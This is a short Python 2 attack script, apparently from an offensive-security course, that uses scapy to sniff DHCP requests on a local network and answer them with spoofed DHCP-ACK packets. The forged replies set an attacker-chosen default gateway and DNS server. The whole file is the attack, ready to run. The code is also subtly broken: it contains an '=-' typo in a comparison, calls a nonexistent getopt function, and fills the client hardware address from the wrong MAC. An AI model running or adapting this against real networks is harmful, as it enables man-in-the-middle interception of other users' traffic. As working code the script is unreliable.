# Offensive Security Software
# SSE Program
# Attack: DHCP Hijacking
# Date: January 31, 2016
# Description:  An internal attacker has a huge interest in abusing DHCP.
# It serves as an easy way to configure a DNS server and avoid the need
# of DNS spoofing.  OR to declare herself as a default gateway.  In the simplest
# case the attacker configures herself as a DHCP server thats sending responses
# requesting clients to achieve this aim.  But it reveals the attackers MAC
# address and makes tracing childs play.  This implementation will craft
# a DHCP-ACK attacks that looks like its coming fom a reah DHCP server on the
# network

import sys
import getopt
import random
import scapy.all as scapy

dev = "en0"
gateway = None
nameserver = None
dhcpserver = None
client_net = "192.168.1."
filter = "udp port 67"

def handle_packet(packet):
    eth = packet.getlayer(scapy.Ether)
    ip = packet.getlayer(scapy.IP)
    udp = packet.getlayer(scapy.UDP)
    bootp = packet.getlayer(scapy.BOOTP)
    dhcp = packet.getlayer(scapy.DHCP)
    dhcp_message_type = None

    if not dhcp:
        return False

    for opt in dhcp.options:
        if opt[0] =- "message-type":
            dhcp_message_type = opt[1]

    #dhcp request
    if dhcp_message_type == 3:
        client_ip = client_net + str(random.randint(2, 254))
        dhcp_ack = scapy.Ether(src=eth.dst, dst=eth.src) / \
                   scapy.IP(src=dhcpserver, dst=client_ip) / \
                   scapy.UDP(sport=udp.dport,
                             dport=udp.sport) / \
                    scapy.BOOTP(op=2,
                                chaddr=eth.dst,
                                siaddr=gateway,
                                yiaddr=client_ip,
                                xid=bootp.xid) / \
                    scapy.DHCP(options=[('message-type', 5),
                                        ('requested_addr', client_ip),
                                        ('subnet_mask', '255.255.255.0'),
                                        ('router', gateway),
                                        ('name_server', nameserver),
                                        ('end')])
        print "Send spoofed DHCP ACK to %s" % ip.src
        scapy.sendp(dhcp_ack, iface=dev)

def usage():
    print sys.argv[0] + """
    -d <dns_ip>
    -g <gateway_ip>
    -i <dev>
    -s <dhcp_ip)"""
    sys.exit(1)

try:
    cmd_opts = "d:g:i:s:"
    opts, args = getopt.getopts(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-i":
        dev = opt[1]
    elif opt[0] == "-g":
        gateway = opt[1]
    elif opt[0] == "-d":
        nameserver = opt[1]
    elif opt[0] == "-s":
        dhcpserver = opt[1]
    else:
        usage()

if not gateway:
    gateway = scapy.get_if_addr(dev)

if not nameserver:
    nameserver = gateway

if not dhcpserver:
    dhcpserver = gateway

print "Hijacking DHCP requests on %s" % (dev)
scapy.sniff(iface=dev, filter=filter, prn=handle_packet)
